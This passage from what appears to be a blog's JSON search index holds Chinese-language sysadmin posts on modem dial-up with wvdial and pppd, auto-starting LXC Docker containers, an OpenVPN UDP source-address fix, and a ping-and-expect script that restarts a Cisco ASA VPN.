MD5\u0026gt; \u0026lt;magic 0xebe7666\u0026gt;] sent [LCP ConfReq id=0x1 \u0026lt;mru 552\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;magic 0x3947d7a8\u0026gt; \u0026lt;pcomp\u0026gt; \u0026lt;accomp\u0026gt;] sent [LCP ConfReq id=0x1 \u0026lt;mru 552\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;magic 0x3947d7a8\u0026gt; \u0026lt;pcomp\u0026gt; \u0026lt;accomp\u0026gt;] rcvd [LCP ConfReq id=0x2 \u0026lt;mru 1500\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;auth chap MD5\u0026gt; \u0026lt;magic 0x125e3a73\u0026gt;] sent [LCP ConfAck id=0x2 \u0026lt;mru 1500\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;auth chap MD5\u0026gt; \u0026lt;magic 0x125e3a73\u0026gt;] 如果是明文认证：\n/usr/sbin/pppd /dev/ttyS0 115200 debug connect \u0026#34;/usr/sbin/chat -v \u0026#39;\u0026#39; ATDT0,28929191 CONNECT \u0026#39;\u0026#39; ogin: ttt assword: qqq\u0026#34; 如果是pap(chap)认证：\n/usr/sbin/pppd /dev/ttyS0 115200 debug user ttt connect \u0026#34;/usr/sbin/chat -v \u0026#39;\u0026#39; ATDT0,28929191 CONNECT \u0026#39;dc\u0026#39; \u0026#34; 看出区别了吧，pap(chap)跟明文的区别就在于多了一个 user ttt 的参数。 这就是pppd拨号的详细过程了，断掉拨号连接就用killall pppd即可。 大家可以把这么长的一行命令写到sh里，就好看了。\n","permalink":"https://rendoumi.com/posts/20240108-modem_dial/","summary":"\u003cp\u003e公司为了跟建设银行建立专线，首先用电话线拨号进行测试。 买回来一个外置的Modem，接在服务器的com1口上，先用电话测试一下，OK没问题，那就继续配modem拨号\u003c/p\u003e\n\u003cp\u003eLinux下配置Modem拨号有两种方式，传统的pppd方式和简单的wvdial方式。\u003c/p\u003e\n\u003ch2 id=\"一wvdial配置\"\u003e一、wvdial配置\u003c/h2\u003e\n\u003cp\u003ewvdial的配置方法超级简单，\n执行命令：\u003ccode\u003ewvdialconf /etc/wvdial.conf\u003c/code\u003e\n它会自动测出系统的Modem，稍微修改一下，加几个参数：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/wvdial.conf \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eDialer Defaults\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eModem\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /dev/ttyS0  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBaud\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e115200\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eInit1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e ATZ  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eInit2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e ATQ0 V1 E1 \u003cspan class=\"nv\"\u003eS0\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003eC1 \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003eD2 +FCLASS\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eISDN\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAuto \u003cspan class=\"nv\"\u003eReconnect\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e on  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eModem \u003cspan class=\"nv\"\u003eType\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Analog Modem  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ePhone\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e0,28929191  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUsername\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e ttt  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ePassword\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e qqq  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这就弄好了，执行wvdail \u0026amp;就可以拨号了，结束也很简单，kill -9 杀掉wvdial和ppd进程即可。\u003c/p\u003e\n\u003cp\u003e注意：wvdial 拨通后系统多了一块网卡ppp0，路由信息都未修改，为了能到达建行的服务器，需要编辑/etc/ppp/ip-up文件，加一句：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroute add -host 12.0.98.150 gw 12.0.98.236 \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后重拨ping一下，ping 12.0.98.150，能ping通就说明ok了。\u003c/p\u003e\n\u003ch2 id=\"二pppd配置\"\u003e二、pppd配置\u003c/h2\u003e\n\u003cp\u003ewvdial隐藏了很多信息，我们下面用pppd来看看真实的拨号过程吧：\u003c/p\u003e\n\u003cp\u003e其实modem拨号认证的方式有两种，一种是显示明文的login:(username:)方式，另一种是显示乱码的pap(chap)方式。\u003c/p\u003e\n\u003cp\u003e①首先：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/ppp/options  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elock  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecrtscts  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edefaultroute  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enoauth  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e②清理一下老的连接：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekillall pppd  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erm /var/lock/LCK..ttyS0  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e③找出认证的方式：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/sbin/pppd /dev/ttyS0 \u003cspan class=\"m\"\u003e115200\u003c/span\u003e debug connect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/usr/sbin/chat -v   \u0026#39;\u0026#39;   \u0026#39;AT\u0026amp;F0\u0026#39;   OK\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eATD0,28929191   CONNECT   \u0026#39;dc\u0026#39; \u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eless /var/log/messages\u003c/p\u003e","title":"Linux下配置Modem拨号"},{"content":"我们的容器采用的是lxc类型，一是为了固定ip，二是避开iptable类型转发的方式。因为我们是强网络管理环境，网络工程师对网络的规划和管控非常强。\n这种方式下启动lxc容器倒是很好办，直接编辑/etc/rc.d/rc.local\ndocker start jko2o-16-13-49 docker start vis-16-13-51 docker start vis-16-13-50 docker start vis-16-13-48 docker start vis-16-13-47 就可以开机自动启动容器了。\n容器内我们是采用supervisord主进程来保持容器不自动销毁的，那么其他命令如果都加入supervisord，那会非常麻烦。\n简单化，用lxc-execute来执行，比较麻烦的就是需要查出来lxc容器的名字，用以下命令查出jko2o-16-13-49的全名：\ndocker inspect -f \u0026#39;{{.Id}}\u0026#39; jko2o-16-13-49 ebe2e6a1249f6f22334014b0072186dfaee52173f3df06cd826f9e64e7d4c51f 然后编辑/etc/rc.d/rc.local，用lxc-execute执行命令就可以了：\n#47 lxc-execute -n e223d81ea73551460b82e1977b92ef07e24437cd1f4494470feafd4ff455104b -- service mysqld start lxc-execute -n e223d81ea73551460b82e1977b92ef07e24437cd1f4494470feafd4ff455104b -- service httpd start #48 lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/mysqld start lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/httpd start lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/wdapache start lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/nginxd start lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/pureftpd start #49 lxc-execute -n ebe2e6a1249f6f22334014b0072186dfaee52173f3df06cd826f9e64e7d4c51f -- /export/servers/nginx178/sbin/nginx #50 lxc-execute -n 5b7e8cd3130d31bae5b089202c7e2092b9daca5f19cc055ce4ee50cf8b789504 -- /export/servers/tomcat/tomcat.sh ","permalink":"https://rendoumi.com/posts/20240108-docker_lxc_startup/","summary":"\u003cp\u003e我们的容器采用的是lxc类型，一是为了固定ip，二是避开iptable类型转发的方式。因为我们是强网络管理环境，网络工程师对网络的规划和管控非常强。\u003c/p\u003e\n\u003cp\u003e这种方式下启动lxc容器倒是很好办，直接编辑/etc/rc.d/rc.local\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker start jko2o-16-13-49  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker start vis-16-13-51  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker start vis-16-13-50  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker start vis-16-13-48  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker start vis-16-13-47  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e就可以开机自动启动容器了。\u003c/p\u003e\n\u003cp\u003e容器内我们是采用supervisord主进程来保持容器不自动销毁的，那么其他命令如果都加入supervisord，那会非常麻烦。\u003c/p\u003e\n\u003cp\u003e简单化，用lxc-execute来执行，比较麻烦的就是需要查出来lxc容器的名字，用以下命令查出jko2o-16-13-49的全名：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker inspect -f \u003cspan class=\"s1\"\u003e\u0026#39;{{.Id}}\u0026#39;\u003c/span\u003e jko2o-16-13-49  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eebe2e6a1249f6f22334014b0072186dfaee52173f3df06cd826f9e64e7d4c51f  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后编辑/etc/rc.d/rc.local，用lxc-execute执行命令就可以了：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#47\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n e223d81ea73551460b82e1977b92ef07e24437cd1f4494470feafd4ff455104b -- service mysqld start  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n e223d81ea73551460b82e1977b92ef07e24437cd1f4494470feafd4ff455104b -- service httpd start  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#48\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/mysqld start  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/httpd start  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/wdapache start  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/nginxd start  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/pureftpd start  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#49\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n ebe2e6a1249f6f22334014b0072186dfaee52173f3df06cd826f9e64e7d4c51f -- /export/servers/nginx178/sbin/nginx  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#50\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n 5b7e8cd3130d31bae5b089202c7e2092b9daca5f19cc055ce4ee50cf8b789504 -- /export/servers/tomcat/tomcat.sh  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4\u003e\u003c/h4\u003e","title":"docker lxc类型容器自启动以及自动执行命令"},{"content":"openvpn server can\u0026rsquo;t use udp port 这个问题非常古怪，我们有两个机房。分别在两边假设了openvpn服务器，一个机房的ovpn就完全正常，而另一个机房的openvpn如果是tcp就没问题，如果是udp就报错，无法连接。把正常机房的openvpn完全复制一份拿过去，也是一样报错，太郁闷了！\n错误提示是：\nTLS Error: TLS key negotiation failed to occur within 60 seconds (check your network connectivity) 非常古怪啊： 在内网用nc来试验udp是否正常：\nnc -ul 1194 在内网随便找一台机器测试：\nnc -u xxxx 1194 然后两边随便输入字符测试，没问题。\n然后从公网测试，就出问题了。nc连接上以后，只能发送一次数据，然后管道就断裂了，无法再传数据。\nnc -u 公网ip 1194 aaa nc: Write error: Connection refused 百思不得其解啊，试了若干次，才发现问题的症结所在。\n错误的那台服务器，有两个网络地址： 172.16.8.4和172.16.8.1 其中8.4的地址是缺省地址，8.1的地址是用ifconfig手动后添加的。 而前端防火墙做得公网映射是映射到了8.1的1194端口\ntcp由于双方是要校验来往src地址的，所以没问题，到了udp，只管发不管收，所以udp包就从8.4的缺省地址发出去，导致双方不一致，无法正常接收了。\n解决方法也很简单，在openvpn服务器端的配置文件中强行指定local端的ip即可：\nlocal 172.16.8.1 ","permalink":"https://rendoumi.com/posts/20240108-opnevpn_udp_port/","summary":"\u003ch5 id=\"openvpn-server-cant-use-udp-port\"\u003eopenvpn server can\u0026rsquo;t use udp port\u003c/h5\u003e\n\u003cp\u003e这个问题非常古怪，我们有两个机房。分别在两边假设了openvpn服务器，一个机房的ovpn就完全正常，而另一个机房的openvpn如果是tcp就没问题，如果是udp就报错，无法连接。把正常机房的openvpn完全复制一份拿过去，也是一样报错，太郁闷了！\u003c/p\u003e\n\u003cp\u003e错误提示是：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTLS Error: TLS key negotiation failed to occur within \u003cspan class=\"m\"\u003e60\u003c/span\u003e seconds \u003cspan class=\"o\"\u003e(\u003c/span\u003echeck your network connectivity\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e非常古怪啊： 在内网用nc来试验udp是否正常：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -ul \u003cspan class=\"m\"\u003e1194\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e在内网随便找一台机器测试：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -u xxxx \u003cspan class=\"m\"\u003e1194\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后两边随便输入字符测试，没问题。\u003c/p\u003e\n\u003cp\u003e然后从公网测试，就出问题了。nc连接上以后，只能发送一次数据，然后管道就断裂了，无法再传数据。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -u 公网ip \u003cspan class=\"m\"\u003e1194\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaaa  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc: Write error: Connection refused  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e百思不得其解啊，试了若干次，才发现问题的症结所在。\u003c/p\u003e\n\u003cp\u003e错误的那台服务器，有两个网络地址： 172.16.8.4和172.16.8.1\n其中8.4的地址是缺省地址，8.1的地址是用ifconfig手动后添加的。 而前端防火墙做得公网映射是映射到了8.1的1194端口\u003c/p\u003e\n\u003cp\u003etcp由于双方是要校验来往src地址的，所以没问题，到了udp，只管发不管收，所以udp包就从8.4的缺省地址发出去，导致双方不一致，无法正常接收了。\u003c/p\u003e\n\u003cp\u003e解决方法也很简单，在openvpn服务器端的配置文件中强行指定local端的ip即可：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elocal\u003c/span\u003e 172.16.8.1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Openvpn服务器端无法开通udp端口的故障排除"},{"content":"Cisco ASA5520 VPN线路的监控和重启 公司从事第三方支付工作，跟很多银行都有合作关系，拉了很多专线直通银行，双方建立VPN，两端都是Cisco的设备，但是，这些线路有时候会莫名其妙的断掉，关键是程序不知道啊，老是重连，一直等到客服反映客户投诉，查一圈程序后才知道。这在生产环境上可是行不通的，找来了所谓Cisco高手，也搞不明白为什么老断，没办法，于是写了两个监控脚本，使用Ping检测VPN对端的状况，一旦Ping不通，就用脚本登陆防火墙，自动重启VPN。\n在安装之前，先安装一个能从命令行发送邮件的软件Email来发送报警邮件，否则每台机器都起sendmail，没什么必要:\nhttps://github.com/muquit/mailsend-go #发送实例 mailsend-go -smtp smtp.126.com -port 25 \\ auth \\ -user xxx@126.com -pass xxx \\ -from xxx@126.com -to \u0026#34;xxx@126.com\u0026#34; \\ -sub \u0026#34;Test\u0026#34; \\ body -msg \u0026#39;hello world\u0026#39; 126邮箱这里的密码用的是授权码 授权密码，不是邮箱密码 说明一下场景：\n210.210.210.3是对端Cisco vpn设备的公网IP 192.168.101.99是建立了VPN后，对端服务器的私网IP地址； 192.168.1.1是己方Cisco ASA5520的私网地址。 #!/bin/sh while [ \u0026#34;1\u0026#34; -eq \u0026#34;1\u0026#34; ] do live=`ping -c4 \u0026#34;192.168.101.99\u0026#34;|wc -l` if [ $live -eq 5 ] ; then /usr/local/bin/mailsend-go -debug -to \u0026#34;ranrui.zhang@rendoumi.com\u0026#34; -from monit@ddky.com -ssl -port 465 -smtp smtp.qiye.aliyun.com \\ auth -user \u0026#34;monit@ddky.com\u0026#34; -pass \u0026#34;xxxxxxxx\u0026#34; \\ -sub \u0026#34;vpn断了\u0026#34; body -msg \u0026#34;`date +%Y`年`date +%m`月`date +%d`日 vpn断了！！！\u0026#34; \\ -cs \u0026#34;utf-8\u0026#34; /usr/local/bin/revpn.sh echo \u0026#34;`date +%Y`年`date +%m`月`date +%d`日 `date +%H`点`date +%M`分 线路不能到达王府井机房，重启VPN。\u0026#34; sleep 60 fi; sleep 60 done 以下是用expect自动登录Cisco路由器重启vpn的脚本 revpn.sh\n#!/usr/bin/expect set timeout 30 spawn ssh pix@192.168.1.1 expect \u0026#34;password:\u0026#34; send \u0026#34;xxxxxxxx\\n\u0026#34; expect \u0026#34;ASAtoTelecom\u0026gt;\u0026#34; send \u0026#34;en\\n\u0026#34; expect \u0026#34;Password:\u0026#34; send \u0026#34;xxxxxxxx\\n\u0026#34; expect \u0026#34;ASAtoTelecom#\u0026#34; send \u0026#34;clear isakmp sa\\n\u0026#34; expect \u0026#34;ASAtoTelecom#\u0026#34; send \u0026#34;clear ipsec sa peer 210.210.210.3\\n\u0026#34; expect \u0026#34;ASAtoTelecom#\u0026#34; send \u0026#34;exit\\n\u0026#34; expect eof exit 0 ","permalink":"https://rendoumi.com/posts/20240107-vpn_monitor/","summary":"\u003ch5 id=\"cisco-asa5520-vpn线路的监控和重启\"\u003eCisco ASA5520 VPN线路的监控和重启\u003c/h5\u003e\n\u003cp\u003e公司从事第三方支付工作，跟很多银行都有合作关系，拉了很多专线直通银行，双方建立VPN，两端都是Cisco的设备，但是，这些线路有时候会莫名其妙的断掉，关键是程序不知道啊，老是重连，一直等到客服反映客户投诉，查一圈程序后才知道。这在生产环境上可是行不通的，找来了所谓Cisco高手，也搞不明白为什么老断，没办法，于是写了两个监控脚本，使用Ping检测VPN对端的状况，一旦Ping不通，就用脚本登陆防火墙，自动重启VPN。\u003c/p\u003e\n\u003cp\u003e在安装之前，先安装一个能从命令行发送邮件的软件Email来发送报警邮件，否则每台机器都起sendmail，没什么必要:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://github.com/muquit/mailsend-go\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#发送实例\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emailsend-go -smtp smtp.126.com -port \u003cspan class=\"m\"\u003e25\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003eauth \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -user xxx@126.com -pass xxx \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -from xxx@126.com -to  \u003cspan class=\"s2\"\u003e\u0026#34;xxx@126.com\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e-sub \u003cspan class=\"s2\"\u003e\u0026#34;Test\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003ebody -msg \u003cspan class=\"s1\"\u003e\u0026#39;hello world\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e126邮箱这里的密码用的是授权码 授权密码，不是邮箱密码\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e说明一下场景：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e210.210.210.3是对端Cisco vpn设备的公网IP\u003c/li\u003e\n\u003cli\u003e192.168.101.99是建立了VPN后，对端服务器的私网IP地址；\u003c/li\u003e\n\u003cli\u003e192.168.1.1是己方Cisco 